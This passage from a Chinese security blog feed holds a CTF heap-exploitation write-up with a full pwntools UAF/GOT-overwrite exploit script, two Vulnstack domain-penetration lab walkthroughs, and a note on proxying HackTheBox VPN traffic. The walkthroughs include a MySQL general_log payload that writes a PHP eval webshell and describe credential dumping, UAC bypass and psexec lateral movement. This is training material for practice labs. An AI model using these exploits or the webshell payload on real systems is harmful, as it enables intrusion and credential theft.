title="onetime"></a>onetime</h2><p>UAF的题，有增删改查的功能，还有一个选项能添加堆块并写入内容，但都只能用一次。</p><p>UAF就处在del功能里，free掉堆块后没将指针置空。</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">cmd_del</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">free</span>(buf);                                    <span class="hljs-comment">// uaf</span></span><br><span class="line">  result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"complete!"</span>);</span><br><span class="line">  add_flag = <span class="hljs-number">0</span>;</span><br><span class="line">  del_flag = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于添加的堆块的大小都为<code>0x60</code>，所以删掉一个堆块得到<code>fastbin</code>，再利用UAF修改<code>fastbin</code>的<code>fd</code>，连续添加两个堆块就能实现任意地址写。</p><p>checksec查了下，没开随机地址，bss上刚好有个<code>0x7f</code>，所以fake chunk就能开bss上了。标记功能使用次数的flag也在bss上，把flag改为大于1，就能绕过了使用次数的限制。</p><p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 215334.png" alt></p><p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 215937.png" alt></p><p>然后改buf的指针到got表，利用读功能得到libc的基址，再然后改got表为one_gadget的方式getshell。</p><p>改了后的bss：</p><p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 220349.png" alt></p><p>测试下来，改<code>read</code>的got，one_gadget能正常使用。</p><p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 221049.png" alt></p><p>exp:</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./onetime'</span></span><br><span class="line">elf = ELF(<span class="hljs-string">'./onetime'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./onetime'</span>)</span><br><span class="line">    libc = context.binary.libc</span><br><span class="line">    print(libc)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'172.20.14.91'</span>,<span class="hljs-number">10001</span>)</span><br><span class="line">    libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_add</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_edit</span><span class="hljs-params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="hljs-string">'fill content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_show</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">'data:'</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_del</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_add_name</span><span class="hljs-params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'5'</span>)</span><br><span class="line">    p.sendafter(<span class="hljs-string">'Hero! Leave your name:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># gdb.attach(p,'b *0x4009be')</span></span><br><span class="line">fake_chunk = <span class="hljs-number">0x602090</span> - <span class="hljs-number">0x3</span></span><br><span class="line">read_got = elf.got[<span class="hljs-string">'read'</span>]</span><br><span class="line"><span class="hljs-comment"># print(read_got)</span></span><br><span class="line"></span><br><span class="line">cmd_add()</span><br><span class="line">cmd_del()</span><br><span class="line">cmd_edit(flat(fake_chunk))</span><br><span class="line">cmd_add()</span><br><span class="line">cmd_add_name(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">3</span>+flat(cyclic(<span class="hljs-number">0x8</span>),read_got,cyclic(<span class="hljs-number">0x10</span>)))</span><br><span class="line">read_got = u64(cmd_show()[:<span class="hljs-number">-1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))</span><br><span class="line">libc.address = read_got - libc.sym[<span class="hljs-string">'read'</span>]</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">one_gadget = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]</span><br><span class="line">cmd_edit(flat(libc.address+one_gadget[<span class="hljs-number">0</span>]))</span><br><span class="line"><span class="hljs-comment"># cmd_del()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;只有两道题都不难，但是最近没怎么做题，生疏了，做了好久才出来，留下没技术的泪水。还好队友给力，带我躺进了决赛。&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://127.0.0.1/categories/PWN/"/>
    
    
    <category term="UAF" scheme="http://127.0.0.1/tags/UAF/"/>
    
    <category term="StackOverflow" scheme="http://127.0.0.1/tags/StackOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[域渗透]Vulnstack2_walkthrough</title>
    <link href="http://127.0.0.1/2020/10/20/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack2_walkthrough/"/>
    <id>http://127.0.0.1/2020/10/20/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack2_walkthrough/</id>
    <published>2020-10-20T12:57:27.000Z</published>
    <updated>2020-10-20T13:07:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>For some reason,I can’t explain.靶机下完好几天了，现在才写walkthrough，主要是太菜了，到现在还没人捞。。。vulnstack2比vulnstack1复杂一点点，但也不难，不过也是设计得不错得一个靶机。感谢红日安全和de1ay师傅提供的靶机。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这次也跟vulnstack1一样，划分了两个虚拟网络。子网地址分别为<code>192.168.111.0</code>和<code>10.10.10.0</code>。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-19 234655.png" alt></p><ul><li>WEB.de1ay.com的两张万卡分别连上VMnet1和VMnet2</li><li>PC.de1ay.com也是连上VMnet1和VMnet2</li><li>DC.de1ay.com则只需要连上VMnet2</li><li>攻击者主机连上VMnet</li></ul><p>最后需要使用账号<code>de1ay\administrator</code>和密码<code>1qaz</code>登录到WEB.de1ay.com，进入到<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录，双击<code>startWebLogic</code>批处理脚本，启动WebLogic。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>WEB.de1ay.com这台主机开放了很多端口，其中80、1433、3389和7001就比较有用，这里7001就是WebLogic的默认端口。另一台主机暂时可能就3389端口比较有用。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 105529.png" alt></p><p>WEB.de1ay.com的80端口进去就是空白页面，扫目录页没有扫到扫东西。</p><p>7001端口直接在浏览器上打开就看到明显是WebLogic的404页面，输入路径<code>/console/login/LoginForm.jsp</code>就能WebLogic的登录界面。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 113153.png" alt></p><h3 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h3><p>既然由WebLogic，那就顺理成章地拿WeblogicScan扫了下，存在CVE-2019-2725。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 150713.png" alt></p><p>刚好msf里有这个洞的利用脚本，直接一把梭getshell。注意这里target默认是unix，用命令<code>set target 1</code>就可以把target设置为Windows。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 151237.png" alt></p><p>最后<code>run</code>就会返回个meterpeter的session，没什么难度。</p><h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><p>个人横向移动更喜欢用cobaltstrike，所以用msf的<code>payload_inject</code>把session派生到cobaltstrike。</p><p>在cs上看到session的用户是administrator，准备收集域信息时，遇到了拒绝访问，一开始还以为是360的锅，但在WEB的虚拟机上，看360不为所动。查下资料得知是UAC的问题，用cs4.0提权模块里的svc-exe即可绕过UAC。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 154700.png" alt></p><p>好奇这个svc-exe是什么原理，又搜了下质料得到这样的解释：psexec打自己。</p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>绕过UAC后，顺利收集到了域信息，当前用户就是域管理员，域控在里一台机子。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 162707.png" alt></p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 162930.png" alt></p><p>mimikatz读了一波密码，顺便翻了翻主机上的文件，感觉没什么敏感信息。<code>ipconfig</code>看了下又两个网段，10.10.10.1/24的就是内网网段。arp扫描下内网，有一个域控，另一个就是域成员主机。</p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>administrator是域管理员，使用administartor的凭证横向移动就行了，但这里遇到个坑，没绕过UAC之前横向移动都失败了，我还以为是设置了某些策略的问题。。。</p><p>使用cs的psexec进行横向移动，Session则选择SYSTEM权限的session。在内网不出网情况下，上线DC只需要像上回那样用smb的Listener即可。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 165622.png" alt></p><p>PC的上线操作也差不多，现在所有的主机都上了线了。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 170017.png" alt></p><p>顺便说下DC.de1ay.com还存在MS17-010，但是用msf的命令执行的payload打一次，session就断一次，太难受了。</p><p>还有最近那个Zerologon也是可以的，毕竟是最新的洞，但那socks代理死活连不上内网/捂脸。只好把网卡直接接到内网。</p><p><img src="/2020/10/20/[域渗透]Vulnstack2_walkthrough/屏幕截图 2020-10-20 191228.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;For some reason,I can’t explain.靶机下完好几天了，现在才写walkthrough，主要是太菜了，到现在还没人捞。。。vulnstack2比vulnstack1复杂一点点，但也不难，不过也是设计得不错得一个靶机。感谢红日安全和de1ay师傅提供的靶机。&lt;/p&gt;</summary>
    
    
    
    <category term="靶机" scheme="http://127.0.0.1/categories/靶机/"/>
    
    
    <category term="域" scheme="http://127.0.0.1/tags/域/"/>
    
  </entry>
  
  <entry>
    <title>[域渗透]Vulnstack1_walkthrough</title>
    <link href="http://127.0.0.1/2020/10/13/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack1_walkthrough/"/>
    <id>http://127.0.0.1/2020/10/13/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack1_walkthrough/</id>
    <published>2020-10-13T03:14:27.000Z</published>
    <updated>2020-10-13T13:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想找找非IIS中间件的windows实战来搞搞，但是暂时没找到，不过无意中看到红日安全做的，练习域渗透的windows靶机：vulnstack，感觉不错。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>按照红日安全公众号的文章，先在vmware的虚拟网络编辑器的添加两个仅主机的虚拟网络，网段分别为<code>192.168.52.0</code>和<code>192.168.72.0</code>。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 143455.png" alt></p><p>Windows 7 x64再添加多一个网卡，分别连上VMnet1和VMnet2；Win2k3 Metasploiteable和Windows Server 2008 R2 x64连上VMnet1；最后攻击者主机最后连上VMnet2。</p><p>最后的最后还需要用密码<code>hongrisec@2019</code>登录到Windows 7 x64，在<code>C:\phpStudy</code>目录里，手动启动phpStudy。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫了下发现开启了80和3306端口，phpStudy的mysql用户名和默认密码都为root，估计都没改，直接能在外网连上mysql。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 100801.png" alt></p><p>http服务打开是一个phpStudy的探针，泄露了web目录的绝对路径。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 153233.png" alt></p><p>扫目录就扫出来个phpmyAdmin和phpinfo。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 161446.png" alt></p><h3 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h3><p>phpmyAdmin用众所周知的用户和密码<code>root</code>，就能登录进去。phpStudy的mysql也是高权限运行的，写文件getshell应该没什么问题。</p><p><code>into outfile</code>在这里用不了，用下面的payload一次性写好shell。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &apos;ON&apos;;</span><br><span class="line">set global general_log_file = &apos;C:/phpStudy/WWW/cmd.php &apos;;</span><br><span class="line">select &apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;;</span><br><span class="line">set global general_log = &apos;OFF&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 164028.png" alt></p><p>蚁剑连上去发现还有备份和一个cms，字典小没有扫到，cms这个方向应该也能getshell，但这里先按下不表。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 215244.png" alt></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>在蚁剑的模拟终端看了下，没有杀软，可以直接powershell无文件上线。</p><p>也因为是phpStudy，所以webshell也直接是高权限，提权都省了。看了下存在域，当前账号就是域管理员，域内主机有三台。</p><figure class="highlight powershell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="hljs-string">"domain admins"</span> /domain</span><br><span class="line">net group <span class="hljs-string">"domain computers"</span> /domain</span><br></pre></td></tr></table></figure><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 230729.png" alt></p><p>有了域管理员账号，讲道理直接横向移动就行，但这里内网主机不出网，还要做点前置操作。对比了几种方法，觉得smb管道正向连接比较简便。</p><ul><li><p>在监听列表添加一个SMB的Beacon。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 233309.png" alt></p></li><li><p>选择当前session，派生到SMB Beacon。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 233533.png" alt></p></li><li><p>psexec横向移动监听选smb，session选派生出来的session。</p></li></ul><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-12 234247.png" alt></p><p>接着等一小会就能上线了，命令能正常执行。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-13 110623.png" alt></p><p>当然除了用域管理员横向移动，MS17-010也很可能能打得到。CS上的MS17-010说实话确实不好用，所以先派生个session到msf上，用<code>autorouter</code>做好路由后，用<code>auxiliary/admin/smb/ms17_010_command</code>模块，不出所料就打到了。其他模块打不动，有时候甚至回重启，也就算了。</p><p><img src="/2020/10/13/[域渗透]Vulnstack1_walkthrough/屏幕截图 2020-10-13 104829.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近想找找非IIS中间件的windows实战来搞搞，但是暂时没找到，不过无意中看到红日安全做的，练习域渗透的windows靶机：vulnstack，感觉不错。&lt;/p&gt;</summary>
    
    
    
    <category term="靶机" scheme="http://127.0.0.1/categories/靶机/"/>
    
    
    <category term="域" scheme="http://127.0.0.1/tags/域/"/>
    
  </entry>
  
  <entry>
    <title>用不可描述的软件做HTB的前置代理</title>
    <link href="http://127.0.0.1/2020/10/05/%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <id>http://127.0.0.1/2020/10/05/%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
    <published>2020-10-05T07:10:53.000Z</published>
    <updated>2020-10-05T07:19:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​前段时间打HTB，一直受到速度慢的困扰，有时等待一些静态资源加载都要好久。由于一些众所周知的原因，而且HTB提供的代理是OpenVpn，更是被重点关注，于是摸索出来给HTB的OpenVpn加个前置代理的方法，可以加快点速度。</p><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>不可描述软件酸酸乳和账号一个（我用的酸酸乳，用V2什么的应该也是可以的吧）</li></ul><p>右键酸酸乳的运行图标，点击端口设置。像下图一样，添加一个端口设置。开关打开、类型选端口转发，目标地址用的HTB节点的域名，按实际情况填，本地端口随意。</p><p><img src="/2020/10/05/用不可描述的软件做HTB的前置代理/屏幕截图 2020-10-04 111807.png" alt="屏幕截图 2020-10-04 111807"></p><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>按照官网上的指引修改协议为tcp（酸酸乳默认只支持tcp）。</p><p>修改udp协议为tcp、修改remote的端口为端口转发的本地监听端口、服务器地址改为端口转发监听的网卡ip地址、修改<code>&lt;tls-auth&gt;</code>标签为<code>&lt;tls-crypt&gt;</code>。</p><p><img src="/2020/10/05/用不可描述的软件做HTB的前置代理/屏幕截图 2020-10-04 123751.png" alt="屏幕截图 2020-10-04 123751"></p><p>修改好并保存，启动openvpn应该就能正常运行了，虽然还是很慢，但静态文件至少还能加载，还是充钱才能变得更强啊。</p><p><img src="/2020/10/05/用不可描述的软件做HTB的前置代理/屏幕截图 2020-10-04 204001.png" alt="屏幕截图 2020-10-04 204001"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;​前段时间打HTB，一直受到速度慢的困扰，有时等待一些静态资源加载都要好久。由于一些众所周知的原因，而且HTB提供的代理是OpenVpn，更是被重点关注，于是摸索出来给HTB的OpenVpn加个前置代理的方法，可以加快点速度。&lt;/p&gt;</summary>
    
    
    
    <category term="日常" scheme="http://127.0.0.1/categories/日常/"/>
    
    
  </entry>
  
</feed>
